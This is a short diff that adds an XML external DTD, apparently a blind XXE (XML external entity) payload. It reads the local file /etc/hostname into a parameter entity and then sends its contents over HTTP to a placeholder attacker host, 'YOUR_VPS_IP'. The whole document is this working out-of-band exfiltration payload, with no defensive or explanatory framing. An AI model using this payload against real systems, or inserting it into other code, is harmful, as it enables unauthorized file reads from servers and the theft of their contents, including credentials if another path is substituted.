@@ -1,0 +1,4 @@
+<!ENTITY % data SYSTEM "file:///etc/hostname">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://YOUR_VPS_IP/exfil?d=%data;'>">
+%eval;
+%exfil;
